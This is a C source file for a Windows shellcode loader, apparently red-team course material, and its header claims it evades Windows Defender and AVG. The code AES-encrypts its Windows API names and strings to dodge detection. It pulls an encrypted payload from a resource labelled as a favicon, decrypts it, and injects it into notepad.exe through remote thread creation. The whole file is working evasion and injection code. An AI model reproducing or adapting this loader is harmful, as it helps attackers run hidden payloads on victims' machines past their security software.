/*

 Red Team Operator course code AES enc AV evasion
 Tested on:
 Windows Defender --> OK
 AVGFree --> OK
 encryption with AES
 p0 == payload
 i0 == Inject
 author: bolo (twitter: @bolonobolo)
 credits: reenz0h (twitter: @sektor7net) for the template

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "resources.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

LPVOID (WINAPI * pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

HRSRC (WINAPI * pFindResourceA)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource)(
  HGLOBAL hResData
);

DWORD (WINAPI * pSizeofResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

VOID (WINAPI * pRtlMoveMemory)(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T Length
);

BOOL (WINAPI * pCloseHandle)(
  HANDLE hObject
);

DWORD (WINAPI * pWaitForSingleObject)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

HANDLE (WINAPI * pOpenProcess)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

//char key[] = { 0xd9, 0x2a, 0x8, 0x38, 0xc8, 0x39, 0xf8, 0xd5, 0x52, 0x57, 0xaf, 0xb6, 0x1c, 0x57, 0xa, 0x7c };
char key[] = { 0x66, 0x6f, 0x72, 0x67, 0x6f, 0x74, 0x74, 0x68, 0x65, 0x70, 0x61, 0x73, 0x74 };
char p0_key[] = { 0x66, 0x6f, 0x72, 0x67, 0x6f, 0x74, 0x74, 0x68, 0x65, 0x70, 0x61, 0x73, 0x74, 0x74, 0x6f, 0x69 };

//Add \x00 to the string before encrypt it eg: printCiphertext(xor("VirtualAlloc\x00",<passphrase>))
//Functions
unsigned char sVirtualAllocEx[] = { 0x8a, 0x2d, 0xb6, 0x2, 0xaf, 0xa2, 0x8d, 0xad, 0x6c, 0xcb, 0xba, 0xbd, 0x1c, 0x1, 0xc3, 0xaa };
unsigned char sWriteProcessMemory[] = { 0x23, 0x8f, 0xb4, 0xde, 0xba, 0x85, 0xe3, 0x65, 0x7d, 0xfd, 0x8d, 0xbb, 0xb3, 0x7b, 0xd7, 0x8e, 0x67, 0x6c, 0xf3, 0x40, 0x92, 0xe6, 0x5b, 0xf3, 0xb9, 0xfa, 0x72, 0x75, 0x5e, 0xe3, 0xd8, 0xe2 };
unsigned char sCreateRemoteThread[] = { 0x2c, 0xb1, 0x2b, 0xb0, 0xd2, 0xb3, 0xe6, 0xc9, 0x25, 0xef, 0x8f, 0xe1, 0x59, 0x6c, 0x44, 0x77, 0xc5, 0xa0, 0xb4, 0xce, 0xdf, 0x73, 0xfb, 0xe, 0xaf, 0xa3, 0x3, 0x12, 0xfa, 0x61, 0xf9, 0x41 };
unsigned char sVirtualAlloc[] = { 0x5f, 0x82, 0xbf, 0x92, 0x77, 0x4, 0xdc, 0xe2, 0x99, 0x37, 0x6, 0x11, 0x1e, 0x75, 0xdb, 0xc0 };
unsigned char sCreateToolhelp32Snapshot[] = { 0x7a, 0x10, 0x51, 0x63, 0x33, 0x3d, 0xa7, 0x6f, 0xe6, 0xb, 0x12, 0x65, 0x86, 0x9c, 0xee, 0x1, 0x52, 0xf2, 0xac, 0xcc, 0x44, 0xbb, 0xff, 0x10, 0xa7, 0x76, 0x49, 0x13, 0xfd, 0x13, 0x49, 0xe5 };
unsigned char sProcess32First[] = { 0xeb, 0x85, 0xcf, 0xa7, 0xd1, 0x60, 0x7, 0xea, 0x1d, 0xdf, 0x7b, 0xc2, 0x9d, 0x72, 0xef, 0x9c };
unsigned char sProcess32Next[] = { 0x1d, 0x9c, 0xc8, 0x46, 0x16, 0x54, 0x57, 0xa3, 0x88, 0xb2, 0xba, 0x5d, 0xdc, 0xd0, 0x3e, 0xc5 };
unsigned char sFindResourceA[] = { 0x7d, 0x7, 0xdb, 0xa7, 0xb7, 0xa4, 0x25, 0x11, 0xfb, 0x29, 0xd8, 0x61, 0x7d, 0x9c, 0xae, 0x5a };
unsigned char sLoadResource[] = { 0x8e, 0xf0, 0x5b, 0x5a, 0x66, 0x58, 0xab, 0xaf, 0xea, 0xfc, 0xa8, 0x2c, 0x2e, 0x40, 0x8d, 0x35 };
unsigned char sLockResource[] = { 0x7d, 0xb4, 0xab, 0x1f, 0x8, 0x33, 0xbf, 0x5c, 0x14, 0xc9, 0x45, 0xa3, 0xd0, 0x96, 0xa6, 0xb4 };
unsigned char sSizeofResource[] = { 0x81, 0x4e, 0x57, 0xe5, 0x9f, 0xf3, 0xf2, 0x64, 0x27, 0xb5, 0xc5, 0x36, 0x73, 0x70, 0x30, 0x9e };
unsigned char sRtlMoveMemory[] = { 0x5c, 0x9e, 0xc4, 0xc9, 0xcf, 0xc6, 0x20, 0x98, 0x91, 0xc8, 0x56, 0x8f, 0xd, 0xb, 0xc9, 0x0 };
unsigned char sCloseHandle[] = { 0xe8, 0x1, 0xb6, 0xf6, 0xea, 0x3a, 0xc1, 0xe6, 0x69, 0xb8, 0x13, 0x80, 0x16, 0x12, 0xaf, 0x9e };
unsigned char sWaitForSingleObject[] = { 0xe8, 0x74, 0x5b, 0xfd, 0xeb, 0x23, 0xdc, 0xd7, 0xf0, 0x9f, 0xfd, 0x8b, 0xb3, 0xab, 0x7, 0x61, 0xdf, 0x2a, 0x7c, 0xcb, 0xe, 0xbc, 0xb5, 0xf9, 0x3d, 0x83, 0xaf, 0xbe, 0x8, 0xca, 0x85, 0x9c };
unsigned char sOpenProcess[] = { 0xfe, 0xc9, 0x6e, 0x69, 0x67, 0x7f, 0xbb, 0x3a, 0x1, 0x7c, 0x26, 0x64, 0x91, 0x82, 0xcc, 0xd4 };
//strings
unsigned char sKernel[] = { 0x76, 0x30, 0xd8, 0x57, 0x95, 0xd6, 0x35, 0x5d, 0x80, 0x19, 0x22, 0xb3, 0x95, 0x5, 0xd7, 0x48 }; //kernel32.dll
unsigned char sExplore[] = { 0x5e, 0x8a, 0xfb, 0x60, 0xb1, 0x3, 0x3f, 0x41, 0xed, 0x85, 0xfe, 0xef, 0x17, 0x21, 0x76, 0xb4 }; //explorer.exe
unsigned char sNtdll[] = { 0xe8, 0x51, 0x8b, 0xd6, 0x35, 0xe4, 0x2a, 0xf5, 0x91, 0x30, 0xec, 0x24, 0x13, 0x79, 0xe9, 0x34 }; //ntdll.dll
unsigned char sNote[] = { 0xd2, 0xec, 0x8a, 0x60, 0x41, 0x96, 0x6e, 0x52, 0x9d, 0xa0, 0x80, 0x33, 0xe4, 0x32, 0xa3, 0x81 }; //notepad.exe
unsigned char sSmart[] = { 0xe, 0xd4, 0xc4, 0x5e, 0x55, 0xc9, 0xda, 0xf3, 0x57, 0xe6, 0xff, 0xe0, 0xae, 0x8, 0xad, 0xc1, 0x26, 0x46, 0x14, 0xab, 0xb2, 0x3f, 0xca, 0x23, 0xb9, 0x57, 0x94, 0x84, 0xbc, 0x73, 0xb6, 0x28 };

int AESDecrypt(char * p0, unsigned int p0_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, p0, &p0_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int Find(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key, sizeof(key));		
		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));		
		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));			
		
		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKernel), sCreateToolhelp32Snapshot);
		pProcess32First = GetProcAddress(GetModuleHandle(sKernel), sProcess32First);
		pProcess32Next = GetProcAddress(GetModuleHandle(sKernel), sProcess32Next);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKernel), sCloseHandle);
       
		hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		
		if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
          
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
        
        pCloseHandle(hProcSnap);
                
        return pid;
}

int i0(HANDLE hProc, unsigned char * p0, unsigned int p0_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
	
		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		AESDecrypt((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
		
		pVirtualAllocEx = GetProcAddress(GetModuleHandle(sKernel), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(sKernel), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(sKernel), sCreateRemoteThread);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKernel), sCloseHandle);
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(sKernel), sWaitForSingleObject);
		
        pRemoteCode = pVirtualAllocEx(hProc, NULL, p0_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)p0, (SIZE_T)p0_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
		
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	int pid = 0;
    HANDLE hProc = NULL;
	
	unsigned char * p0;
	unsigned int p0_len;
	
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	AESDecrypt((char *) sSizeofResource, sizeof(sSizeofResource), key, sizeof(key));
	AESDecrypt((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), key, sizeof(key));
	AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), key, sizeof(key));
	AESDecrypt((char *) sKernel, sizeof(sKernel), key, sizeof(key));
	AESDecrypt((char *) sExplore, sizeof(sExplore), key, sizeof(key));
	AESDecrypt((char *) sNtdll, sizeof(sNtdll), key, sizeof(key));
	AESDecrypt((char *) sNote, sizeof(sNote), key, sizeof(key));
	AESDecrypt((char *) sSmart, sizeof(sSmart), key, sizeof(key));
	
	
	pVirtualAlloc = GetProcAddress(GetModuleHandle(sKernel), sVirtualAlloc);
	pFindResourceA = GetProcAddress(GetModuleHandle(sKernel), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle(sKernel), sLoadResource);
	pLockResource = GetProcAddress(GetModuleHandle(sKernel), sLockResource);
	pSizeofResource = GetProcAddress(GetModuleHandle(sKernel), sSizeofResource);
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sNtdll), sRtlMoveMemory);
	pCloseHandle = GetProcAddress(GetModuleHandle(sKernel), sCloseHandle);
	pOpenProcess = GetProcAddress(GetModuleHandle(sKernel), sOpenProcess);
	
	// Extract payload from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	p0 = (char *) pLockResource(resHandle);
	p0_len = pSizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = pVirtualAlloc(0, p0_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Copy payload to new memory buffer
	pRtlMoveMemory(exec_mem, p0, p0_len);
	
	// Decrypt payload
	AESDecrypt((char *) exec_mem, p0_len, p0_key, sizeof(p0_key));
	
	// Injection process starts here
	//pid = Find(sExplore);
	pid = Find(sNote);
	//pid = Find(sSmart);
	
	if (pid) {
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
		if (hProc != NULL) {
			i0(hProc, exec_mem, p0_len);
			pCloseHandle(hProc);
		}
	}

	return 0;
}

